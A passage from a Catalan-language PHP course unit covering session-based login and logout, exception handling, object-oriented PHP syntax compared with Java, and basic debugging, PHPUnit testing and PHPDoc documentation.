+> 📖 Documentació oficial: [PHP: session_regenerate_id](https://www.php.net/manual/es/function.session-regenerate-id.php)
+
+**`pagina_privada.php`**
+
+```php
+<?php
+session_start();
+
+if (!isset($_SESSION['usuari'])) {
+    header('Location: login.php');
+    exit;
+}
+?>
+<p>Benvingut/da, <?= htmlspecialchars($_SESSION['usuari']) ?>!</p>
+<a href="logout.php">Tancar sessió</a>
+```
+
+**`logout.php`**
+
+```php
+<?php
+session_start();
+$_SESSION = [];
+session_destroy();
+header('Location: login.php');
+exit;
+```
+
+### Missatges genèrics per a no revelar informació
+
+::: warning Atenció
+No indiques mai si l'error és "l'usuari no existeix" o "la contrasenya és incorrecta" per separat: dóna sempre un missatge genèric com "Usuari o contrasenya incorrectes". Si no, un atacant podria esbrinar quins noms d'usuari existixen al sistema simplement provant-los un a un.
+:::
+
+> 📖 Documentació oficial: [PHP: password_needs_rehash](https://www.php.net/manual/es/function.password-needs-rehash.php)
+
+---
+
+📌 **A recordar:** mai guardes contrasenyes en text pla ni amb `md5()`/`sha1()`; utilitza sempre `password_hash()` per a crear-les i `password_verify()` per a comprovar-les; regenera l'ID de sessió (`session_regenerate_id()`) després d'un login correcte.
+
+> 📖 Documentació oficial: [PHP: Funciones de Password Hashing](https://www.php.net/manual/es/book.password.php) · [OWASP: Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
+
+
+## 7. Gestió d'errors i excepcions
+
+Fins ara, quan volíem detectar un problema (una dada no vàlida, un arxiu que no existix...) ho hem fet amb comprovacions manuals (`if`, arrays d'`$errors`...). PHP incorpora, a més, un sistema propi per a gestionar **errors** i **excepcions** de manera estructurada, especialment útil quan el problema és inesperat o quan es treballa amb funcions/mètodes que poden fallar de moltes maneres diferents.
+
+::: info Nota
+És important distingir dos conceptes que sovint es confonen: els **errors** són problemes de baix nivell del propi llenguatge (una funció que no existix, un tipus incorrecte...), mentre que les **excepcions** són objectes que el propi programador (o una llibreria) llança de manera intencionada quan detecta una situació anòmala.
+:::
+
+### Tipus d'errors en PHP
+
+| Tipus | Descripció | Exemple |
+|---|---|---|
+| `Notice` / `Warning` | Avís lleu, l'script continua | Accedir a una clau d'array inexistent |
+| `Error` (fatal) | L'script s'atura immediatament | Cridar a una funció que no existix |
+| `Exception` | Situació anòmala llançada intencionadament | Dividir per zero, dada no vàlida |
+
+```php
+<?php
+// Warning: no atura l'script
+echo $variableNoDefinida ?? 'valor per defecte';
+
+// Error fatal: sí atura l'script
+funcioQueNoExisteix();
+```
+
+> 📖 Documentació oficial: [PHP: Errores](https://www.php.net/manual/es/language.errors.php)
+
+### `try`, `catch` i `throw`
+
+Una **excepció** és un objecte que representa un error. Es "llança" amb `throw` i es "captura" amb `try`/`catch`, evitant que l'script s'ature de colp i permetent reaccionar-hi de manera controlada.
+
+```php
+<?php
+function dividir(float $a, float $b): float {
+    if ($b === 0.0) {
+        throw new Exception('No es pot dividir per zero.');
+    }
+    return $a / $b;
+}
+
+try {
+    echo dividir(10, 0);
+} catch (Exception $e) {
+    echo 'S\'ha produït un error: ' . htmlspecialchars($e->getMessage());
+}
+
+echo 'L\'script continua executant-se amb normalitat.';
+```
+
+::: tip Bona pràctica
+El codi dins del bloc `try` s'ha d'executar sempre fins que troba el problema; si `dividir()` llança l'excepció, l'`echo` posterior a dins del `try` **no** s'arriba a executar, i el control passa directament al `catch`.
+:::
+
+> 📖 Documentació oficial: [PHP: Excepciones](https://www.php.net/manual/es/language.exceptions.php)
+
+### El bloc `finally`
+
+S'executa **sempre**, tant si hi ha hagut excepció com si no. Útil per a tasques de neteja (tancar un arxiu, una connexió...).
+
+```php
+<?php
+try {
+    echo dividir(10, 0);
+} catch (Exception $e) {
+    echo 'Error: ' . htmlspecialchars($e->getMessage());
+} finally {
+    echo 'Este bloc s\'executa sempre, hi haja error o no.';
+}
+```
+
+### Mètodes útils de l'objecte `Exception`
+
+```php
+<?php
+try {
+    throw new Exception('Missatge d\'error personalitzat', 42);
+} catch (Exception $e) {
+    echo $e->getMessage();  // 'Missatge d'error personalitzat'
+    echo $e->getCode();     // 42
+    echo $e->getLine();     // Línia on s'ha llançat l'excepció
+    echo $e->getFile();     // Arxiu on s'ha llançat l'excepció
+}
+```
+
+---
+
+📌 **A recordar:** utilitza `try`/`catch`/`throw` per a gestionar situacions anòmales de manera controlada; ordena els `catch` de més específic a més genèric; no reveles mai detalls tècnics de les excepcions a l'usuari final.
+
+> 📖 Documentació oficial: [PHP: Excepciones](https://www.php.net/manual/es/language.exceptions.php) · [PHP: Manejo de errores](https://www.php.net/manual/es/book.errorfunc.php)
+
+## 8. Classes i objectes
+
+Ja coneixes la programació orientada a objectes des de Java (1r curs del cicle): classes, atributs, mètodes, constructors, herència... Els conceptes són exactament els mateixos; el que canvia és la **sintaxi** i algunes particularitats pròpies de PHP. Este punt se centra, per tant, en com s'apliquen eixos conceptes en PHP, no en explicar la POO des de zero.
+
+::: info Nota
+PHP és un llenguatge de tipatge dinàmic i opcional (a diferència de Java), també en POO: pots indicar tipus als atributs, paràmetres i valors de retorn (com farem en tots els exemples), però no és obligatori fer-ho.
+:::
+
+> 📖 Documentació oficial: [PHP: Programación orientada a objetos](https://www.php.net/manual/es/language.oop5.php)
+
+### Definir una classe
+
+```php
+<?php
+class Usuari {
+    // Atributs (propietats)
+    public string $nom;
+    public string $email;
+    private string $contrasenyaHash;
+
+    // Constructor
+    public function __construct(string $nom, string $email, string $contrasenya) {
+        $this->nom = $nom;
+        $this->email = $email;
+        $this->contrasenyaHash = password_hash($contrasenya, PASSWORD_DEFAULT);
+    }
+
+    // Mètode
+    public function verificarContrasenya(string $contrasenya): bool {
+        return password_verify($contrasenya, $this->contrasenyaHash);
+    }
+
+    public function __toString(): string {
+        return "{$this->nom} <{$this->email}>";
+    }
+}
+```
+
+```php
+<?php
+$usuari = new Usuari('Ana', 'ana@exemple.com', 'contrasenya123');
+
+echo $usuari->nom;                                  // Ana
+echo $usuari->verificarContrasenya('contrasenya123'); // true (1)
+echo $usuari;                                        // Ana <ana@exemple.com> (crida __toString)
+```
+
+::: warning Atenció
+En PHP, l'accés a propietats i mètodes es fa amb la fletxa `->`, **no** amb el punt (`.`) com en Java. El punt en PHP és l'operador de concatenació de cadenes (ja el coneixes de la unitat anterior).
+:::
+
+### Visibilitat: `public`, `private`, `protected`
+
+Exactament els mateixos tres nivells que en Java:
+
+| Modificador | Accés |
+|---|---|
+| `public` | Des de qualsevol lloc |
+| `protected` | Des de la mateixa classe i les seues subclasses |
+| `private` | Només des de la mateixa classe |
+
+```php
+<?php
+class CompteBancari {
+    private float $saldo = 0;
+
+    public function ingressar(float $import): void {
+        if ($import > 0) {
+            $this->saldo += $import;
+        }
+    }
+
+    public function consultarSaldo(): float {
+        return $this->saldo;
+    }
+}
+
+$compte = new CompteBancari();
+$compte->ingressar(100);
+echo $compte->consultarSaldo(); // 100
+
+// echo $compte->saldo; // ❌ Error: no es pot accedir a una propietat privada
+```
+
+::: tip Bona pràctica
+Com en Java, declara les propietats com a `private` per defecte i exposa'n l'accés només a través de mètodes públics (*getters*/*setters* o mètodes amb lògica, com `ingressar()`). Açò es coneix com **encapsulació**.
+:::
+
+### Propietats promocionades del constructor (PHP 8+)
+
+PHP permet, des de la versió 8.0, estalviar-se la redundància de declarar la propietat i assignar-la al constructor, fent-ho tot alhora:
+
+```php
+<?php
+class Producte {
+    public function __construct(
+        private string $nom,
+        private float $preu,
+        private int $estoc = 0
+    ) {}
+
+    public function getNom(): string {
+        return $this->nom;
+    }
+
+    public function getPreu(): float {
+        return $this->preu;
+    }
+}
+
+$producte = new Producte('Teclat', 25.99, 10);
+echo $producte->getNom(); // Teclat
+```
+
+::: info Nota
+Este exemple és equivalent a declarar les tres propietats `private` fora del constructor i assignar-les manualment amb `$this->nom = $nom;`, etc. És una simplificació sintàctica molt utilitzada en codi PHP modern (i en frameworks com Laravel).
+:::
+
+### Herència: `extends`
+
+```php
+<?php
+class Persona {
+    public function __construct(
+        protected string $nom,
+        protected int $edat
+    ) {}
+
+    public function presentar(): string {
+        return "Sóc {$this->nom} i tinc {$this->edat} anys.";
+    }
+}
+
+class Estudiant extends Persona {
+    public function __construct(
+        string $nom,
+        int $edat,
+        private string $cicle
+    ) {
+        parent::__construct($nom, $edat); // Crida al constructor de la classe mare
+    }
+
+    // Sobreescriptura (override) d'un mètode
+    public function presentar(): string {
+        return parent::presentar() . " Curse el cicle de {$this->cicle}.";
+    }
+}
+
+$estudiant = new Estudiant('Bru', 17, 'DAW');
+echo $estudiant->presentar();
+// Sóc Bru i tinc 17 anys. Curse el cicle de DAW.
+```
+
+::: warning Atenció
+Fixa't que `nom` i `edat` estan declarades com a `protected` (no `private`) a `Persona`: així la subclasse `Estudiant` hi pot accedir directament amb `$this->nom`. Amb `private`, ni tan sols les subclasses hi tindrien accés.
+:::
+
+### Classes abstractes i interfícies
+
+Igual que en Java, PHP distingix entre **classes abstractes** (`abstract class`) i **interfícies** (`interface`).
+
+```php
+<?php
+interface Notificable {
+    public function enviarNotificacio(string $missatge): void;
+}
+
+abstract class Figura {
+    abstract public function calcularArea(): float;
+
+    public function descriure(): string {
+        return 'Esta figura té una àrea de ' . $this->calcularArea() . ' unitats quadrades.';
+    }
+}
+
+class Rectangle extends Figura implements Notificable {
+    public function __construct(
+        private float $base,
+        private float $altura
+    ) {}
+
+    public function calcularArea(): float {
+        return $this->base * $this->altura;
+    }
+
+    public function enviarNotificacio(string $missatge): void {
+        echo "Notificació: $missatge";
+    }
+}
+
+$rectangle = new Rectangle(4, 5);
+echo $rectangle->descriure();          // Esta figura té una àrea de 20 unitats quadrades.
+$rectangle->enviarNotificacio('Hola'); // Notificació: Hola
+```
+
+::: info Nota
+Com en Java: una classe abstracta no es pot instanciar directament (`new Figura()` donaria error) i pot combinar mètodes ja implementats (com `descriure()`) amb mètodes abstractes que obliguen a implementar-los a les subclasses (`calcularArea()`). Una classe pot implementar (`implements`) diverses interfícies, però només pot estendre (`extends`) **una** classe.
+:::
+
+> 📖 Documentació oficial: [PHP: Clases abstractas](https://www.php.net/manual/es/language.oop5.abstract.php) · [PHP: Interfaces de Objetos](https://www.php.net/manual/es/language.oop5.interfaces.php)
+
+### Propietats i mètodes estàtics
+
+Pertanyen a la classe en si, no a una instància concreta. S'accedixen amb `::` en lloc de `->`.
+
+```php
+<?php
+class Comptador {
+    private static int $total = 0;
+
+    public function __construct() {
+        self::$total++;
+    }
+
+    public static function getTotal(): int {
+        return self::$total;
+    }
+}
+
+new Comptador();
+new Comptador();
+new Comptador();
+
+echo Comptador::getTotal(); // 3
+```
+
+::: tip Bona pràctica
+Dins d'una classe, s'utilitza `self::` per a referir-se a propietats o mètodes estàtics de la pròpia classe (equivalent conceptualment al `NomClasse.` estàtic de Java), mentre que `$this->` s'utilitza per a propietats i mètodes d'instància.
+:::
+
+### Constants de classe
+
+```php
+<?php
+class Configuracio {
+    const VERSIO = '1.0';
+    const MAX_INTENTS_LOGIN = 3;
+}
+
+echo Configuracio::VERSIO; // 1.0
+```
+
+### `readonly` (PHP 8.1+)
+
+Propietats que, una vegada assignades (normalment al constructor), no es poden modificar. Útil per a objectes immutables.
+
+```php
+<?php
+class Punt {
+    public function __construct(
+        public readonly float $x,
+        public readonly float $y
+    ) {}
+}
+
+$punt = new Punt(3, 4);
+echo $punt->x; // 3
+
+// $punt->x = 10; // ❌ Error: no es pot modificar una propietat readonly
+```
+
+### Namespaces: organitzar classes en projectes grans
+
+En Java estàs acostumat als paquets (`package`); en PHP l'equivalent són els **espais de noms** (*namespaces*), que eviten col·lisions de noms entre classes de diferents parts d'un projecte (o de llibreries externes).
+
+```php
+<?php
+// arxiu: src/Model/Usuari.php
+namespace App\Model;
+
+class Usuari {
+    // ...
+}
+```
+
+```php
+<?php
+// arxiu: index.php
+require __DIR__ . '/src/Model/Usuari.php';
+
+use App\Model\Usuari;
+
+$usuari = new Usuari();
+```
+
+::: info Nota
+En projectes reals, els namespaces es combinen amb l'**autoload** de Composer (seguint l'estàndard **PSR-4**), de manera que no cal fer `require` manualment de cada arxiu de classe. Ho veurem amb detall quan treballem amb Laravel.
+:::
+
+> 📖 Documentació oficial: [PHP: Espacios de nombres](https://www.php.net/manual/es/language.namespaces.php)
+
+---
+
+📌 **A recordar:** els conceptes de POO són els mateixos que ja coneixes de Java; canvia la sintaxi (`->` en lloc de `.`, `$this->` en lloc de `this.`, `::` per a membres estàtics) i PHP afig facilitats pròpies com les propietats promocionades del constructor o `readonly`.
+
+> 📖 Documentació oficial: [PHP: Programación Orientada a Objetos](https://www.php.net/manual/es/language.oop5.php) · [PHP: PSR-4 Autoloading](https://www.php-fig.org/psr/psr-4/)
+
+## 9. Debug, proves i documentació [Ampliació]
+
+Fins ara, per a detectar errors hem utilitzat sobretot `echo` i `print_r()` col·locats manualment al codi. En este últim punt vorem, de manera bàsica, ferramentes més professionals per a depurar codi (Xdebug), per a comprovar que funciona correctament de manera automatitzada (PHPUnit) i per a documentar-lo (PHPDoc).
+
+### Depuració bàsica sense ferramentes externes
+
+Abans d'introduir Xdebug, recorda les funcions natives que ja pots utilitzar en qualsevol entorn:
+
+```php
+<?php
+var_dump($variable);      // Mostra el tipus i el valor, amb molt de detall
+print_r($array);          // Mostra el contingut d'un array/objecte de manera llegible
+echo gettype($variable);  // Mostra el tipus de la variable
+```
+
+::: tip Bona pràctica
+Embolica les crides de depuració temporal amb un comentari clar (`// DEBUG`) o, millor encara, elimina-les abans de pujar el codi a producció. Deixar `var_dump()` oblidats és un error molt comú.
+:::
+
+::: warning Atenció
+Per a veure els *warnings* i *notices* mentre desenvolupes (útils per a detectar variables no definides, per exemple), assegura't que `display_errors` i `error_reporting(E_ALL)` estan activats al teu entorn de desenvolupament. En producció, en canvi, estos errors s'han de registrar en un log i **mai** mostrar-se a l'usuari.
+:::
+
+```php
+<?php
+// Configuració recomanada en desenvolupament (a l'inici de l'script, o al php.ini)
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+```
+
+> 📖 Documentació oficial: [PHP: error_reporting](https://www.php.net/manual/es/function.error-reporting.php)
+
+### Xdebug: depuració pas a pas
+
+**Xdebug** és una extensió de PHP que permet depurar el codi de manera molt més potent que amb `var_dump()`: col·locar *breakpoints* (punts d'aturada), executar l'script línia a línia, inspeccionar l'estat de totes les variables en cada moment i vore la pila de crides (*call stack*), directament des de l'editor.
+
+::: info Nota
+A diferència de les altres ferramentes d'esta unitat, Xdebug **no s'instal·la amb Composer**: és una extensió de PHP que s'ha d'habilitar a nivell de servidor/entorn (XAMPP, Docker, etc.) i configurar a l'editor (VS Code, PhpStorm...).
+:::
+
+#### Ús bàsic amb Visual Studio Code
+
+1. Instal·lar l'extensió **PHP Debug** (de Xdebug) al VS Code.
+2. Col·locar un *breakpoint* fent clic a l'esquerra del número de línia.
+3. Iniciar la depuració (F5) i fer la petició al navegador: l'execució s'aturarà al breakpoint.
+4. Des del panell de depuració es pot inspeccionar cada variable, avançar línia a línia (*step over*, *step into*) i continuar l'execució.
+
+::: tip Bona pràctica
+Encara que Xdebug siga molt potent, per a errors senzills (una variable amb el valor inesperat, un array mal format) sovint és més ràpid un `var_dump()` puntual. Reserva Xdebug per a errors complexos, on cal seguir el flux d'execució pas a pas o entendre per què una funció no es comporta com s'espera.
+:::
+
+### PHPUnit: proves automatitzades
+
+Fins ara, per a comprovar que una funció funciona correctament, l'hem executada manualment i n'hem mirat l'eixida. **PHPUnit** permet escriure proves (*tests*) que comproven automàticament que el codi es comporta com s'espera, i que es poden tornar a executar en qualsevol moment (per exemple, després de modificar codi) per a assegurar-se que no s'ha trencat res.
+
+::: info Nota
+Este és un primer tast molt bàsic de PHPUnit. En unitats posteriors, treballant amb Laravel (que incorpora PHPUnit integrat), aprofundirem en tipus de proves més complets.
+:::
+
+#### Instal·lació amb Composer
+
+```bash
+composer require --dev phpunit/phpunit
+```
+
+::: tip Bona pràctica
+S'instal·la amb el flag `--dev` perquè PHPUnit és una eina de **desenvolupament**: no ha de formar part del codi que s'executa en producció.
+:::
+
+#### Estructura bàsica d'un test
+
+Suposem la classe següent que volem testejar:
+
+```php
+<?php
+// src/Calculadora.php
+class Calculadora {
+    public function sumar(float $a, float $b): float {
+        return $a + $b;
+    }
+
+    public function dividir(float $a, float $b): float {
+        if ($b === 0.0) {
+            throw new InvalidArgumentException('No es pot dividir per zero.');
+        }
+        return $a / $b;
+    }
+}
+```
+
+```php
+<?php
+// tests/CalculadoraTest.php
+use PHPUnit\Framework\TestCase;
+
+require_once __DIR__ . '/../src/Calculadora.php';
+
+class CalculadoraTest extends TestCase {
+
+    public function testSumaDosNombresPositius(): void {
+        $calculadora = new Calculadora();
+        $resultat = $calculadora->sumar(2, 3);
+
+        $this->assertEquals(5, $resultat);
+    }
+
+    public function testDividirPerZeroLlançaExcepcio(): void {
+        $calculadora = new Calculadora();
+
+        $this->expectException(InvalidArgumentException::class);
+        $calculadora->dividir(10, 0);
+    }
+}
+```
+
+::: warning Atenció
+Els mètodes de test han de començar sempre pel prefix `test` (per exemple, `testSumaDosNombresPositius`) perquè PHPUnit els reconega i els execute automàticament.
+:::
+
+#### Execució de les proves
+
+```bash
+./vendor/bin/phpunit tests
+```
+
+Eixida esperada si tot funciona correctament:
+PHPUnit 10.x
+
+.. 2 / 2 (100%)
+
+Time: 00:00.015, Memory: 6.00 MB
+
+OK (2 tests, 2 assertions)
+
+
+#### Mètodes d'aserció més habituals
+
+| Mètode | Comprova |
+|---|---|
+| `assertEquals($esperat, $real)` | Que dos valors són iguals (`==`) |
+| `assertSame($esperat, $real)` | Que dos valors són idèntics (`===`, tipus inclòs) |
+| `assertTrue($valor)` / `assertFalse($valor)` | Que un valor és `true`/`false` |
+| `assertNull($valor)` | Que un valor és `null` |
+| `assertCount($n, $array)` | Que un array té `$n` elements |
+| `expectException($classe)` | Que el codi llança una excepció d'eixa classe |
+
+> 📖 Documentació oficial: [PHPUnit: Documentación](https://docs.phpunit.de/en/10.5/) · [PHPUnit: Assertions](https://docs.phpunit.de/en/10.5/assertions.html)
+
+### Documentació del codi: PHPDoc
+
+**PHPDoc** és la convenció estàndard per a documentar codi PHP mitjançant blocs de comentaris especials, que a més permeten que l'editor (VS Code, PhpStorm...) mostre ajuda i autocompletat.
+
+```php
+<?php
+/**
+ * Calcula el preu final d'un producte aplicant un descompte.
+ *
+ * @param float $preu Preu original del producte, en euros.
+ * @param float $percentatgeDescompte Percentatge de descompte a aplicar (0-100).
+ * @return float Preu final després d'aplicar el descompte.
+ * @throws InvalidArgumentException Si el percentatge no està entre 0 i 100.
+ */
+function calcularPreuAmbDescompte(float $preu, float $percentatgeDescompte): float {
+    if ($percentatgeDescompte < 0 || $percentatgeDescompte > 100) {
+        throw new InvalidArgumentException('El percentatge ha d\'estar entre 0 i 100.');
+    }
+
+    return $preu * (1 - $percentatgeDescompte / 100);
+}
+```
+
+Etiquetes (*tags*) més habituals:
+
+| Etiqueta | Ús |
+|---|---|
+| `@param` | Descriu un paràmetre (tipus + nom + descripció) |
+| `@return` | Descriu el valor de retorn |
+| `@throws` | Indica quines excepcions pot llançar la funció |
+| `@var` | Indica el tipus d'una propietat de classe |
+| `@deprecated` | Marca una funció/mètode obsolet |
+
+::: tip Bona pràctica
+Encara que PHP permet ja indicar tipus directament a la signatura de la funció (`float $preu`), el PHPDoc continua sent útil per a **explicar el propòsit** del paràmetre (no només el tipus) i per a documentar excepcions (`@throws`), cosa que la signatura de la funció no reflectix.
+:::
+
+```php
+<?php
+class Producte {
+    /** @var string Nom del producte */
+    private string $nom;
+
+    /** @var float Preu en euros, sense IVA */
+    private float $preu;
+}
+```
+
+> 📖 Documentació oficial: [PHPDoc: phpDocumentor](https://docs.phpdoc.org/guide/getting-started/what-is-a-docblock.html)
+
+---
+
+📌 **A recordar:** `var_dump()`/`print_r()` per a depuracions ràpides, Xdebug per a seguir l'execució pas a pas en errors complexos, PHPUnit per a automatitzar la comprovació que el codi funciona correctament, i PHPDoc per a documentar el propòsit de funcions, paràmetres i excepcions.
+
+> 📖 Documentació oficial: [Xdebug](https://xdebug.org/docs/) · [PHPUnit](https://docs.phpunit.de/en/10.5/) · [phpDocumentor](https://docs.phpdoc.org/)
